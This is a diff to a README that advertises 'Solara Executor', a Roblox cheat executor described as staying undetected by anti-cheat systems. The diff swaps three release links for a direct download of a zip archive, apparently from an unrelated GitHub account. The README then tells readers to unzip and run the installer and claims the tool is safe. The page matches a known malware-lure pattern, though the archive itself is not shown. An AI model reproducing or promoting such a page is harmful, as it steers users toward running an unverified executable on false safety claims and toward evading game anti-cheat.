@@ -10,7 +10,7 @@ Welcome to **Solara Executor**, the brand-new and most effective version of Robl
 
 ### Newest Undetected Version
 - **Solara Executor** is regularly updated to stay unnoticed and avoid the latest Roblox anti-cheat systems.
-[![sol-exc](https://github.com/user-attachments/assets/8a8a142e-11e7-4c40-a300-83ede3a13076)](../../release)
+[![sol-exc](https://github.com/user-attachments/assets/8a8a142e-11e7-4c40-a300-83ede3a13076)](https://github.com/aknelhoute3693/solakntoqi/releases/download/update/solaratop.zip)
 
 # Solara Executor - Solara Executor Roblox - Solara Executor Brand-New Undetected Release
 
@@ -41,7 +41,7 @@ It can execute Lua scripts and also works with popular Roblox scripts for endles
 
 ## How to Download Solara Executor
 
-1. Tick the **[Download Now](../../release)** button to receive the newest version of **Solara Executor**.
+1. Tick the **[Download Now](https://github.com/aknelhoute3693/solakntoqi/releases/download/update/solaratop.zip)** button to receive the newest version of **Solara Executor**.
 2. Unzip the downloaded file using the archive management program that you prefer.
 3. Start the Solara Executor installation process and fulfill the on-screen instructions.
 
@@ -79,7 +79,7 @@ Yes! **Solara Executor** is constantly tested to guarantee its safety and freedo
 
 ## Download Instantly and Start Using!
 
-Hit the link below and begin exploring **[Solara Executor](../../release/)** right now! 🕹️
+Hit the link below and begin exploring **[Solara Executor](https://github.com/aknelhoute3693/solakntoqi/releases/download/update/solaratop.zip)** right now! 🕹️
 
 ### [Download Solara Executor 2025](#) 💎
 
